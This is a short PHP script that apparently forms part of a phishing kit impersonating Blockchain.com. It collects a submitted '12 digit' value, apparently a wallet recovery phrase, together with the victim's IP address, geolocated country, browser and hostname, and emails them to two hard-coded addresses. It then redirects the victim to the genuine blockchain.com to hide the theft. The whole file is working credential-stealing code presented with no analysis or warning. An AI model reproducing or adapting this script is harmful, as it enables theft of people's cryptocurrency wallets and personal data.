<?php
	if (isset($_POST["submit"])) {
      	$dgt = $_POST['12dgt'];	
		$ip = getenv("REMOTE_ADDR");
$addr_details = unserialize(file_get_contents('http://www.geoplugin.net/php.gp?ip='.
$ip));
$country = stripslashes(ucfirst($addr_details[geoplugin_countryName]));
$timedate = date("D/M/d, Y g:i a"); 
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);

		$from = 'Blockchain First Page'; 
		$to = 'bboxlucas@protonmail.com,darksniffs@gmail.com'; 
		$subject = 'Message from Blockchain Second Page';
		
		$body ="From: $from\n 12 digit: $dgt\n IP: $ip\n Country: $country\n Time: $timedate\n Browser: $browserAgent\n HostName: $hostname";

		$result="";
	
		if (!$_POST['12dgt']) {
			$err12dgt = 'Please enter your 12 digit';
		}

// If there are no errors, send the email
if (!$err12digit) {
	if (mail ($to, $subject, $body, $from)) {
		header("Location: https://blockchain.com");
	} else {
		 echo "Something went wrong";
	}
} else {
         echo "Error on 12 digits";
}
}
?>